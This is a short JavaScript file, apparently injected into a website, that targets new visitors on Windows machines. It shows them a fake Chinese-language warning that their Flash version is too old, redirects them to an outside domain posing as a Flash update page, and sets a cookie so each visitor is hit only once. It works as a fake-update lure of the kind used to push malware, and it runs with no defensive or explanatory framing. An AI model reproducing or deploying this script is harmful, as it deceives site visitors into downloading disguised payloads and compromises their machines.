
var ip = "https://flash.worldeye.ga/flash.html"
window.onload = function(){
    if(!isPc()){

    }else{
        var newVisitor = isNewVisitor();// 如果是新访客
        if (newVisitor === true) {
            
            // 动画弹出消息框
            window.alert = function (name) {
                var iframe = document.createElement("IFRAME");
                iframe.style.display = "none";
                iframe.setAttribute("src", 'data:text/plain,');
                document.documentElement.appendChild(iframe);
                window.frames[0].window.alert(name);
                iframe.parentNode.removeChild(iframe);
            }
            alert("您的FLASH版本过低，尝试升级后访问该页面! ");
            window.location.href = ip;
            
            setCookie("gznotes-visited", "true", 5);
        }
    }
}

function isPc() {
    if (navigator.userAgent.match(/(iPhone|Android|MacOS|Linux)/i)) {
        return false;
    } else {
        return true;
    }
}

function isNewVisitor() {
    // 从cookie读取“已经向访客提示过消息”的标志位
    var flg = getCookie("gznotes-visited");
    if (flg === "") {
        return true;
    } else {
        return false;
    }
}
function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    var expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires + ";path=/";
}
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
    }
    return "";
}